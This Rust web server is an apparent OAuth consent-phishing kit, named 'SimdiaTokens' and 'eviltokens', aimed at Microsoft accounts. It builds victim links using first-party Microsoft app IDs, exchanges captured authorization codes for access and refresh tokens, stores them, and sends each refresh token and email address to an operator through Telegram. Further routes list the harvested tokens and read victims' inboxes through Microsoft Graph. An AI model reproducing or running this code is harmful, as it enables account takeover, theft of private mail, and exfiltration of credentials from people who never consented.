use actix_web::{web, App, HttpServer, HttpResponse, Responder};
use serde::{Deserialize, Serialize};
use sqlx::{SqlitePool, sqlite::SqlitePoolOptions};
use chrono::{Utc, Duration};
use uuid::Uuid;
use std::env;
use dotenv::dotenv;
use reqwest::Client;
use rand::Rng;

// ------------------- CONFIGURATION -------------------
#[derive(Debug, Clone)]
struct AppConfig {
    client_id: String,
    client_secret: String,
    redirect_uri: String,
    first_party_ids: Vec<String>,
    database_url: String,
    telegram_bot_token: Option<String>,
    telegram_chat_id: Option<String>,
}

impl AppConfig {
    fn from_env() -> Self {
        Self {
            client_id: env::var("CLIENT_ID").expect("CLIENT_ID not set"),
            client_secret: env::var("CLIENT_SECRET").expect("CLIENT_SECRET not set"),
            redirect_uri: env::var("REDIRECT_URI").expect("REDIRECT_URI not set"),
            first_party_ids: vec![
                "04b07795-8ddb-461a-bbee-02f9e1bf7b46".to_string(),
                "a672d62c-fc7b-4e81-a576-e60dc46e951d".to_string(),
                "d3590ed6-52b3-4102-aeff-aad2292ab01c".to_string(),
            ],
            database_url: env::var("DATABASE_URL").unwrap_or_else(|_| "sqlite:eviltokens.db".to_string()),
            telegram_bot_token: env::var("TELEGRAM_BOT_TOKEN").ok(),
            telegram_chat_id: env::var("TELEGRAM_CHAT_ID").ok(),
        }
    }
}

#[derive(Debug, sqlx::FromRow)]
struct HarvestedToken {
    id: String,
    email: Option<String>,
    access_token: String,
    refresh_token: String,
    expires_at: chrono::DateTime<Utc>,
    captured_at: chrono::DateTime<Utc>,
    source: String,
}

struct AppState {
    pool: SqlitePool,
    config: AppConfig,
    http_client: Client,
}

fn generate_id() -> String {
    Uuid::new_v4().to_string()
}

async fn send_telegram_notification(config: &AppConfig, refresh_token: &str, email: &str) {
    if let (Some(token), Some(chat_id)) = (&config.telegram_bot_token, &config.telegram_chat_id) {
        let message = format!("🎯 *New Token Captured!*\n\nEmail: `{}`\nRefresh Token: `{}`\nTime: {}", email, refresh_token, Utc::now());
        let url = format!("https://api.telegram.org/bot{}/sendMessage", token);
        let params = [
            ("chat_id", chat_id.as_str()),
            ("text", message.as_str()),
            ("parse_mode", "Markdown"),
        ];
        let _ = reqwest::Client::new()
            .post(&url)
            .form(&params)
            .send()
            .await;
    }
}

async fn fetch_user_email(access_token: &str) -> Option<String> {
    let client = Client::new();
    let resp = client
        .get("https://graph.microsoft.com/v1.0/me")
        .header("Authorization", format!("Bearer {}", access_token))
        .send()
        .await
        .ok()?;
    let body: serde_json::Value = resp.json().await.ok()?;
    Some(body.get("userPrincipalName")?.as_str()?.to_string())
}

#[derive(Deserialize)]
struct ExchangeQuery {
    code: String,
}

async fn exchange_code(query: web::Query<ExchangeQuery>, state: web::Data<AppState>) -> impl Responder {
    let code = &query.code;
    let token_url = "https://login.microsoftonline.com/common/oauth2/v2.0/token";
    let params = [
        ("client_id", state.config.client_id.as_str()),
        ("client_secret", state.config.client_secret.as_str()),
        ("grant_type", "authorization_code"),
        ("code", code.as_str()),
        ("redirect_uri", state.config.redirect_uri.as_str()),
    ];
    let client = &state.http_client;
    let res = client.post(token_url).form(&params).send().await;
    match res {
        Ok(resp) => {
            let body: serde_json::Value = resp.json().await.unwrap_or_default();
            if let (Some(access_token), Some(refresh_token)) = (body.get("access_token").and_then(|v| v.as_str()), body.get("refresh_token").and_then(|v| v.as_str())) {
                let id = generate_id();
                let expires_in = body.get("expires_in").and_then(|v| v.as_i64()).unwrap_or(3600);
                let expires_at = Utc::now() + Duration::seconds(expires_in);
                let email = fetch_user_email(access_token).await;
                let query = sqlx::query(
                    "INSERT INTO harvested (id, email, access_token, refresh_token, expires_at, captured_at, source) VALUES (?, ?, ?, ?, ?, ?, ?)"
                )
                .bind(&id)
                .bind(&email)
                .bind(access_token)
                .bind(refresh_token)
                .bind(expires_at)
                .bind(Utc::now())
                .bind("oauth_app");
                let _ = query.execute(&state.pool).await;
                if let Some(email) = email {
                    send_telegram_notification(&state.config, refresh_token, &email).await;
                }
                HttpResponse::Ok().json(serde_json::json!({"status": "token_stored"}))
            } else {
                HttpResponse::BadRequest().json(serde_json::json!({"error": "token_exchange_failed", "details": body}))
            }
        }
        Err(e) => HttpResponse::InternalServerError().json(serde_json::json!({"error": format!("request_failed: {}", e)}))
    }
}

async fn admin_dashboard(state: web::Data<AppState>) -> impl Responder {
    let rows = sqlx::query_as::<_, HarvestedToken>("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source FROM harvested ORDER BY captured_at DESC LIMIT 100")
        .fetch_all(&state.pool)
        .await
        .unwrap_or_default();
    let mut html = String::from(r#"<!DOCTYPE html><html><head><title>SimdiaTokens Admin</title><style>body{font-family:Arial;background:#1a1a2e;color:#eee;padding:20px;}table{width:100%;border-collapse:collapse;}th,td{padding:10px;border-bottom:1px solid #333;}.token{font-family:monospace;font-size:12px;}button{background:#0078d4;color:#fff;border:none;padding:5px 10px;border-radius:4px;cursor:pointer;}button:hover{background:#005a9e;}</style></head><body><h1>SimdiaTokens Harvested Tokens</h1><tr><tr><th>ID</th><th>Email</th><th>Refresh Token</th><th>Expires</th><th>Source</th><th>Actions</th></tr>"#);
    for token in rows {
        let email = token.email.as_deref().unwrap_or("unknown");
        let refresh_short = if token.refresh_token.len() > 20 { format!("{}...", &token.refresh_token[..20]) } else { token.refresh_token.clone() };
        html.push_str(&format!(
            "<tr><td>{}</td><td>{}</td><td class='token'>{}</td><td>{}</td><td>{}</td><td><a href='/inbox_view?token_id={}'><button>View Inbox</button></a></td></tr>",
            token.id, email, refresh_short, token.expires_at, token.source, token.id
        ));
    }
    html.push_str("</table></body></html>");
    HttpResponse::Ok().content_type("text/html").body(html)
}

async fn generate_link(state: web::Data<AppState>) -> impl Responder {
    let mut rng = rand::thread_rng();
    let first_party_id = state.config.first_party_ids[rng.gen_range(0..state.config.first_party_ids.len())].clone();
    let scope = "openid offline_access User.Read Mail.Read Files.ReadWrite.All";
    let redirect_uri = &state.config.redirect_uri;
    let auth_url = format!(
        "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id={}&response_type=code&redirect_uri={}&scope={}",
        first_party_id, redirect_uri, scope
    );
    let html = format!(
        r#"<!DOCTYPE html><html><body><h2>Campaign Link (copy and send to victim)</h2><input type="text" value="{}" style="width:80%;padding:10px;" readonly /><p>This link uses Microsoft's own trusted app – no unverified warning. Victim clicks Accept → token captured.</p></body></html>"#,
        auth_url
    );
    HttpResponse::Ok().content_type("text/html").body(html)
}

async fn status() -> impl Responder {
    HttpResponse::Ok().json(serde_json::json!({"status": "operational"}))
}

#[derive(Deserialize)]
struct InboxQuery {
    token_id: String,
}

async fn inbox_viewer(state: web::Data<AppState>, query: web::Query<InboxQuery>) -> impl Responder {
    let row: Option<HarvestedToken> = sqlx::query_as("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source FROM harvested WHERE id = ?")
        .bind(&query.token_id)
        .fetch_optional(&state.pool)
        .await
        .unwrap_or(None);
    if let Some(token) = row {
        let fresh_access = refresh_access_token(&state, &token.refresh_token).await;
        let access = fresh_access.unwrap_or(token.access_token);
        let client = reqwest::Client::new();
        let resp = client.get("https://graph.microsoft.com/v1.0/me/messages?$top=10&$orderby=receivedDateTime DESC")
            .header("Authorization", format!("Bearer {}", access))
            .send()
            .await;
        match resp {
            Ok(r) => {
                let body: serde_json::Value = r.json().await.unwrap_or_default();
                HttpResponse::Ok().json(body)
            }
            Err(e) => HttpResponse::InternalServerError().json(serde_json::json!({"error": e.to_string()}))
        }
    } else {
        HttpResponse::NotFound().body("Token not found")
    }
}

async fn inbox_view_html(state: web::Data<AppState>, query: web::Query<InboxQuery>) -> impl Responder {
    let row: Option<HarvestedToken> = sqlx::query_as("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source FROM harvested WHERE id = ?")
        .bind(&query.token_id)
        .fetch_optional(&state.pool)
        .await
        .unwrap_or(None);
    if let Some(token) = row {
        let fresh_access = refresh_access_token(&state, &token.refresh_token).await;
        let access = fresh_access.unwrap_or(token.access_token);
        let client = reqwest::Client::new();
        let resp = client.get("https://graph.microsoft.com/v1.0/me/messages?$top=20&$orderby=receivedDateTime DESC")
            .header("Authorization", format!("Bearer {}", access))
            .send()
            .await;
        match resp {
            Ok(r) => {
                let data: serde_json::Value = r.json().await.unwrap_or_default();
                let mut html = String::from(r#"<!DOCTYPE html><html><head><title>Inbox</title><style>body{font-family:Arial;background:#f0f2f5;margin:0;padding:20px;}h2{color:#333;}.email{background:white;margin-bottom:10px;padding:15px;border-radius:8px;box-shadow:0 1px 3px rgba(0,0,0,0.1);}.subject{font-weight:bold;margin-bottom:5px;}.from{color:#666;font-size:14px;}.time{color:#999;font-size:12px;float:right;}.body{font-size:14px;margin-top:10px;color:#333;}</style></head><body><h1>Inbox for token</h1>"#);
                if let Some(msgs) = data.get("value").and_then(|v| v.as_array()) {
                    for msg in msgs {
                        let subject = msg.get("subject").and_then(|v| v.as_str()).unwrap_or("(no subject)");
                        let from = msg.get("from").and_then(|v| v.get("emailAddress")).and_then(|v| v.get("address")).and_then(|v| v.as_str()).unwrap_or("unknown");
                        let received = msg.get("receivedDateTime").and_then(|v| v.as_str()).unwrap_or("");
                        let body_preview = msg.get("bodyPreview").and_then(|v| v.as_str()).unwrap_or("");
                        html.push_str(&format!(
                            "<div class='email'><div class='subject'>{}</div><div class='from'>From: {}</div><div class='time'>{}</div><div class='body'>{}</div></div>",
                            subject, from, received, body_preview
                        ));
                    }
                } else {
                    html.push_str("<p>No emails found or error retrieving messages.</p>");
                }
                html.push_str("</body></html>");
                HttpResponse::Ok().content_type("text/html").body(html)
            }
            Err(e) => HttpResponse::InternalServerError().body(format!("Error fetching inbox: {}", e))
        }
    } else {
        HttpResponse::NotFound().body("Token not found")
    }
}

async fn refresh_access_token(state: &AppState, refresh_token: &str) -> Option<String> {
    let token_url = "https://login.microsoftonline.com/common/oauth2/v2.0/token";
    let params = [
        ("client_id", state.config.client_id.as_str()),
        ("client_secret", state.config.client_secret.as_str()),
        ("grant_type", "refresh_token"),
        ("refresh_token", refresh_token),
    ];
    let res = state.http_client.post(token_url).form(&params).send().await.ok()?;
    let body: serde_json::Value = res.json().await.ok()?;
    body.get("access_token").and_then(|v| v.as_str()).map(|s| s.to_string())
}

async fn init_db(pool: &SqlitePool) -> Result<(), sqlx::Error> {
    sqlx::query(
        "CREATE TABLE IF NOT EXISTS harvested (
            id TEXT PRIMARY KEY,
            email TEXT,
            access_token TEXT NOT NULL,
            refresh_token TEXT NOT NULL,
            expires_at DATETIME NOT NULL,
            captured_at DATETIME NOT NULL,
            source TEXT NOT NULL
        )"
    ).execute(pool).await?;
    Ok(())
}

#[actix_web::main]
async fn main() -> std::io::Result<()> {
    dotenv().ok();
    let config = AppConfig::from_env();
    let pool = SqlitePoolOptions::new()
        .max_connections(5)
        .connect(&config.database_url)
        .await
        .expect("Failed to create database pool");
    init_db(&pool).await.expect("Failed to init DB");
    let http_client = Client::new();
    let app_state = web::Data::new(AppState { pool, config, http_client });
    
    let port = std::env::var("PORT").unwrap_or_else(|_| "8080".to_string());
    let port = port.parse::<u16>().unwrap_or(8080);
    
    println!("SimdiaTokens backend running on http://0.0.0.0:{}", port);
    HttpServer::new(move || {
        App::new()
            .app_data(app_state.clone())
            .route("/exchange", web::get().to(exchange_code))
            .route("/admin", web::get().to(admin_dashboard))
            .route("/generate", web::get().to(generate_link))
            .route("/status", web::get().to(status))
            .route("/inbox", web::get().to(inbox_viewer))
            .route("/inbox_view", web::get().to(inbox_view_html))
    })
    .bind(("0.0.0.0", port))?
    .run()
    .await
}